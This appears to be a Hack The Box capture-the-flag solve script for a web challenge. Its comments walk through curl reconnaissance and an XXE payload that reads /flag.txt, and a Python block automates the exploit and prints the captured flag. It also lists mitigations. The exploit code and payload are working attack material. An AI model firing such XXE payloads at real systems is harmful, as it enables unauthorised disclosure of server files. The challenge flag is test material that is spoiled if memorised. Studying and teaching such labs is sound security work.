#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Jailbreak
# Category: Web
# Platform: Hack The Box
#
# Description:
# We are given a Pip-Boy themed firmware update interface. The scenario hints
# that we need to bypass the device protections and it explicitly says the flag
# is stored in:
# /flag.txt
#
# Spawned target used during solving:
# http://154.57.164.74:30679
#
# Core lesson:
# XML parsers can become dangerous when they allow external entity expansion.
# If the server parses attacker-controlled XML with DTDs enabled, we may be
# able to make it read local files from the server.
#
# This is the classic XXE pattern:
# <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
#
# and then reference:
# &xxe;
#
# Step 1: Identify the interesting route.
# Manual command:
# curl -s http://154.57.164.74:30679/rom
#
# Reason:
# The ROM page contains a "Firmware Update" form with a textarea that expects
# XML input.
#
# Step 2: Read the client-side JavaScript.
# Manual command:
# curl -s http://154.57.164.74:30679/static/js/update.js
#
# Reason:
# The JavaScript shows the exact backend endpoint:
# POST /api/update
# with Content-Type: application/xml
#
# Step 3: Confirm normal behavior.
# Manual command:
# curl -s -X POST http://154.57.164.74:30679/api/update \
#   -H 'Content-Type: application/xml' \
#   --data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'
#
# Reason:
# The response reflects the parsed firmware version:
# "Firmware version 1.33.7 update initiated."
#
# That reflection is important because it gives us a clean place to display the
# contents of an external entity.
#
# Step 4: Send an XXE payload.
# Manual command:
# curl -s -X POST http://154.57.164.74:30679/api/update \
#   -H 'Content-Type: application/xml' \
#   --data-binary @- <<'EOF'
# <?xml version="1.0"?>
# <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
# <FirmwareUpdateConfig>
#   <Firmware>
#     <Version>&xxe;</Version>
#   </Firmware>
# </FirmwareUpdateConfig>
# EOF
#
# Reason:
# The XML parser resolves &xxe; by reading /flag.txt from the server filesystem.
# The application then inserts that value into the JSON success message.
#
# Real-world concept:
# XXE can lead to:
# - local file disclosure
# - SSRF
# - access to cloud metadata endpoints
# - denial of service through entity expansion
#
# Safe parsing generally means:
# - disable external entity resolution
# - disable DTD processing when not needed
# - treat uploaded XML as untrusted input
#
# Flag obtained:
# HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_c89ad12a436c81cabb1d862cf6c06547}

host="${1:-154.57.164.74}"
port="${2:-30679}"

python3 - "$host" "$port" <<'PY'
import re
import sys

import requests

host = sys.argv[1]
port = sys.argv[2]
base = f"http://{host}:{port}"

payload = """<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
"""

r = requests.post(
    f"{base}/api/update",
    data=payload.encode(),
    headers={"Content-Type": "application/xml"},
    timeout=15,
)

match = re.search(r"HTB\{[^}]+\}", r.text)
if not match:
    raise SystemExit(r.text)

print(match.group(0))
PY
